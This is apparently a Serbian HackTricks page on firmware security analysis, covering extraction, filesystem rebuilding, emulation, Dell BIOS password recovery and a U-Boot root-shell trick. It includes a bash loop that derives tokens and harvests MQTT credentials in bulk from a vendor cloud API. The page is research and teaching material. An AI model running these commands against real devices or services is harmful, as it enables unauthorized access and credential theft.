# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za preuzimanje podataka preko izloženih hardverskih interfejsa pogledajte [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Za ponovljivo UART snimanje tokom pokretanja, pre pristupa konzoli, pogledajte [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja, upravljajući komunikacijom između hardverskih komponenti i softvera sa kojim korisnici rade. Čuva se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno menjanje firmvera ključan je korak u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Rasporedu hardvera i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i otkrivenim ranjivostima

U tu svrhu su alati za **open-source intelligence (OSINT)** neprocenjivi, kao i analiza svih dostupnih open-source softverskih komponenti putem ručnih i automatizovanih pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Preuzimanje firmvera**

Firmver se može pribaviti na različite načine, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** prema dostavljenim uputstvima
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih firmver datoteka
- Direktnim pristupom **cloud skladištima**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Izdvajanjem** sa uređaja preko veza kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- **Izvlačenjem** iz bootloader-a ili preko mreže
- **Uklanjanjem i čitanjem** memorijskog čipa, ako ništa drugo ne uspe, uz korišćenje odgovarajućih hardverskih alata

### Samo UART logovi: forsiranje root shell-a preko U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete da forsirate init shell tako što ćete **izmeniti U-Boot environment blob** van mreže:<sup>[[6]](#references)</sup>

1. Očitati SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da sadrži `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; trebalo bi da se pojavi shell na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloadera onemogućen, ali je env particija upisiva putem eksternog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da izdvojite informacije o njemu da biste znali kako da postupite. Evo nekoliko alata koje možete da koristite:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću komande `binwalk -E <bin>`. Ako je entropija niska, verovatno nije šifrovana. Ako je visoka, verovatno je šifrovana (ili na neki način komprimovana).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmver**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili upotrebite [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da biste pregledali datoteku.

### Diferencijalna analiza fleša i oporavljiva XOR skladišta tajni

Kada format skladištenja neke postavke firmvera nije dokumentovan, prvo napravite nekoliko očitavanja fleša istog stanja, promenite **tačno jednu** postavku, ponovo napravite dump celog čipa i uporedite pomeraje. Ponavljanje eksperimenta sa kontrolisanim vrednostima pomaže da razlikujete postavku od brojača i metapodataka o upisivanju; promene na novim pomerajima umesto na postojećim ukazuju na skladište koje samo dodaje podatke ili je strukturisano kao dnevnik. Sačuvajte obrisane unose i unose označene kao obrisane jer njihovi bajtovi sadržaja možda i dalje mogu da se povrate.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon pronalaženja regiona, izdvojite module firmvera pomoću alata kao što je `binwalk` i reverzno analizirajte writer/validator u Ghidri. U kodu potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa, umesto da šemu zaključujete samo na osnovu obrazaca šifrata.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovanog paddinga nulama

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine posebno je izloženo kada se njegov padding nulama proteže kroz sve indekse ponavljajućeg XOR ključa: šifrovani padding direktno otkriva te bajtove ključa, jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrata, pa dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Ranjivi DVAR format za BIOS lozinku kompanije Dell konkretan je primer: bajt `0` 32-bajtnog polja je otvoreni tekst, dok se za bajtove `1..31` koristi ponavljajući ključ dužine 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR operacije. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu oporaviti bez brute force-a:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini ulaz koji zavisi od lozinke jeste njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele isti ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu može otkriti ceo ključ iz kratkog istorijskog zapisa preko padding-a, pa se njime može dešifrovati aktuelni, duži zapis čiji padding nije dovoljan. Rotacija lozinke zato može povećati izloženost ako se stari šifrat označi kao obrisan umesto da se izbriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove bajtove sačuvane u zapisu/ključu. Napravite ga iz checkout-a i skenirajte proverenu flash sliku ovako:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parser-e odbacujte lažno pozitivne rezultate na osnovu strukture zapisa, ograničenja za štampive znakove, provera popunjavanja nulama, entropije ključa i doslednosti na mestu gde se ključ ciklično ponavlja. Ako ponovljeni dump-ovi pokazuju retke promene bitova po upisu, navedite uočene maske i rangirajte moguće ispravke prema ovim ograničenjima, ali prijavite dvosmislene znakove umesto da heuristički dobijen rezultat predstavljate kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Provere lozinki treba da čuvaju jednosmerni hash sa salt-om koji se iterira, a ne reverzibilni šifrat, a skladišta sa log-strukturom treba bezbedno da uklanjaju zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Dobijanje fajl-sistema

Pomoću prethodno navedenih alata, kao što je `binwalk -ev <bin>`, trebalo je da možete **da izdvojite fajl-sistem**.\
Binwalk obično izdvaja fajl-sistem u **fasciklu nazvanu prema tipu fajl-sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl-sistema

Ponekad binwalk **nema magic byte fajl-sistema u svojim potpisima**. U tim slučajevima, upotrebite binwalk da **pronađete offset fajl-sistema, izdvojite kompresovani fajl-sistem** iz binarne datoteke i **ručno izdvojite** fajl-sistem u skladu s njegovim tipom, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs fajl-sistema.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Nakon toga, datoteke će se nalaziti u direktorijumu "`squashfs-root`".

- Datoteke CPIO arhive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 fajl-sisteme

`$ jefferson rootfsfile.jffs2`

- Za ubifs fajl-sisteme sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ponovno sastavljanje podeljenih ugrađenih root fajl-sistema

Ako sirovi eMMC/SSD dump sadrži ispravno zaglavlje fajl-sistema, ali se njegovi pomeraji metapodataka protežu izvan nominalne particije, nemoj ga odmah označiti kao oštećen. Ugrađeni boot kod može da sastavi stvarni root uređaj iz više fizičkih raspona pomoću Device Mapper-a, pa izdvajanje jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Početna procena kompletne slike medija

Najpre proveri da li je prikupljanje podataka završeno, da li je veličina stabilna i da li neki proces i dalje upisuje u sliku. Ako naziv datoteke sadrži početnu i završnu adresu, uporedi taj raspon sa stvarnim brojem bajtova. Oporavi GPT u režimu samo za čitanje i prikači samo potreban raspon; **nemoj** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici jer može doći do sukoba grupa volumena i neželjenih upisa.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte privremenu VM kada originalna init logika ili LVM stek moraju da vide celu sliku. Istorijski logovi pokretanja sa standardne boot particije naročito su korisni: bootloader je možda zabeležio pomeraje vlasničkog kontejnera, dužine komponenti, izbor slota, pravila poravnanja i proveru potpisa. Iskoristite te vrednosti da izdvojite ugrađenu komandnu liniju, kernel i initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, magičnih bajtova i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Oporavite mapu blokova pri pokretanju

Izdvojite initramfs kernela i reverzno analizirajte njegov `/init` i biblioteke za skladištenje. U odeljku [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) pratite reference nizova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i pravi tabelu. Korisne početne tačke za rad sa radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cilj `linear` mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pozadinskih uređaja. Oporavljena tabela sa dva segmenta obično ima sledeći oblik (sve pozicije i dužine su izražene u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tačno reprodukujte aritmetiku mašinskog koda, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek onda je konvertuje u sektore od 512 bajtova; ako ga zamenite izrazom `p4_bytes // 512`, izabrani kraj se pomera za `p4_bytes % 4096` kad god particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruisati flat analysis image kopiranjem opsega redosledom iz tabele, u ograničenim blokovima umesto učitavanja kompletnog media dump-a u memoriju. Time se izbegava i kreiranje mapper uređaja na strani hosta. GPT-derived ofsete, obrnute brojeve sektora i rezultujuću dužinu izlaza zadržati kao zasebne tvrdnje.<sup>[[9]](#references)</sup>

#### Razlikovati korupciju od konstantne greške pri rekonstrukciji

Za SquashFS proveriti `hsqs` magic i dekodirati little-endian 64-bitno polje `bytes_used` na ofsetu 40 u superbloku pre pokretanja `unsquashfs`. Ako izdvajanje ne uspe u nekoliko nepovezanih struktura, pretražiti širok prozor oko očekivanih pozicija i zahtevati snažne strukturne kandidate: metadata blok koji može da se dekompresuje, nekoliko uzastopnih validnih stavki direktorijuma, uverljiva inode polja, root inode koji odgovara broju inode-ova ili validnu strukturu integrity metadata. Jedno podudaranje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada ista potpisana razlika učini validnim nezavisne strukture — na primer, metapodatke direktorijuma i verity zapis — verovatan uzrok je sistematska greška u početnoj poziciji segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granicu sektora/stranice pre nego što pokušate oporavak izgubljenih podataka ili zakrpljivanje metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojene: LUKS volumeni čiji je ključ zapečaćen TPM-om štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet korenskog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a preko istraživačkog init-a koji izostavlja proveru verity-ja ne falsifikuje njegov potpis niti narušava dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmvera

Kada se firmver pribavi, neophodno je analizirati ga kako bi se razumela njegova struktura i moguće ranjivosti. Ovaj postupak podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Početni alati za analizu

U nastavku je dat skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju nizova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenio status šifrovanja slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija ukazuje na moguće šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje sistema datoteka

Pomoću `binwalk -ev <bin>` obično je moguće izdvojiti sistem datoteka, često u direktorijum nazvan po tipu sistema datoteka (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip sistema datoteka zbog nedostajućih magičnih bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje pomeraja sistema datoteka, a zatim komande `dd` za izdvajanje sistema datoteka:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa sistema datoteka (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza sistema datoteka

Kada se sistem datoteka izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se obraća na nebezbedne mrežne daemon-e, hardkodovane akreditive, API endpoint-e, funkcionalnosti servera za ažuriranje, nekompajlirani kod, skripte za pokretanje i kompajlirane binarne datoteke za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za akreditive korisnika
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog mogućih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb-servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u pronalaženju osetljivih informacija i ranjivosti u sistemu datoteka:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

Izvorni kod i kompajlirane binarne datoteke pronađene u sistemu datoteka moraju se pregledati zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u identifikovanju nezaštićenih binarnih datoteka koje bi mogle da se iskoriste.

## Prikupljanje cloud konfiguracije i MQTT akreditiva putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao heksadecimalni zapis velikim slovima

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u otvorenom tekstu i prefikse topic-a.

Praktični postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a za cloud konfiguraciju i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavi STATIC_KEY i algoritam tokena iz firmvera

- Učitaj binarne datoteke u Ghidra/radare2 i pretraži putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdi algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash-u i pretvori digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; parsirajte ga pomoću jq-a da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba MQTT-a u otvorenom tekstu i slabih ACL-ova za teme (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz odobrenje)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa dobavljača, iza kojih sledi sekvencijalni sufiks.
- Možete iterirati kroz moguće ID-jeve, programski izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovnog enumerisanja.
- Kada je moguće, dajte prednost emulaciji ili statičkoj analizi za otkrivanje tajni, bez izmene ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje root filesystem-a ili konkretnih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i redosledom bajtova, kao što je Raspberry Pi, ili na unapred napravljenu virtuelnu mašinu, može olakšati dodatno testiranje.

### Emulacija pojedinačnih binarnih datoteka

Za analizu pojedinačnih programa ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

A za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristio bi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući postupak i olakšavajući dinamičku analizu.

### Rekonstrukcija podeljenih i verifikovanih root sistema datoteka za emulaciju

Ako je superblok SquashFS-a čitljiv, ali su pomeraji inode-a, direktorijuma ili fragment-tabele nemogući, nemojte odmah menjati `unsquashfs`. Obrnutim inženjeringom analizirajte rani boot binarni fajl i reprodukujte graf blokovskih uređaja koji on kreira: ugrađeni sistemi mogu izložiti nominalnu root particiju, ali izgraditi stvarni sistem datoteka pomoću `dm-linear` mapiranja koje dodaje sektore pozajmljene iz druge particije. Provere samo superbloka mogu uspeti čak i kada su svi naredni blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmware-a tačno. Naročito utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i skraćivanje istim redosledom kao u originalu; i uzmite u obzir završne regione koji zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može pomeriti dodati opseg za nekoliko kilobajta i oštetiti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Koristan postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz binarnog fajla verifier/init utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja njihove semantike poravnanja.
3. Ako izdvajanje i dalje ne uspeva, pretražite samo mali raspon oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo naizgled ispravan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolazak kroz sve direktorijume i fragmente jači je dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity pod kontrolom analitičara

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom vendor-ovog verifikacionog PID 1 malim, statički povezanim init-om. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne probijanje dm-verity-ja, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog pomoću TPM-a.<sup>[[11]](#references)</sup>

Zameni init treba da oponaša operativne delove originalne putanje pokretanja: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka isporučeni blokovski uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-sisteme datoteka starog root-a, premesti novi mount na `/`, pozove `chroot` i izvrši `execve()` nad originalnim firmware-ovim `/sbin/init`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk montiran samo za čitanje obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debagovanje stanja image-a van mreže

Pregledajte trajno stanje izvan gostujućeg sistema kada sporo pokretanje, destruktivne skripte pri pokretanju ili nepouzdano logovanje konzole otežavaju utvrđivanje uzroka kvara. Nikada ne priključujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite otkrivanje LVM-a na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivo izolovanje kvarova, upisujte vremenski označene marker fajlove na stabilan volumen sa dozvolom za upis i proveravajte ih van mreže; `/dev/kmsg`, FIFO-ovi i prolazne konzole mogu dati lažno negativne rezultate zbog ograničenja učestalosti ili ranog gašenja procesa. Takođe uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, funkcije ext4-a na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram ABI-ja DRI drajvera i naziva drajvera izvedenih iz PCI podataka. Komponenta može postojati i čak uspešno izvršiti `dlopen()`, a ipak biti neupotrebljiva jer njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi okruženje stvarnog ili emuliranog uređaja. Neophodno je održavati pristup shell-u operativnog sistema i fajl-sistemu. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će možda povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati fajl-sistem, iskorišćavanje izloženih veb-stranica i mrežnih servisa i istraživanje ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za otkrivanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

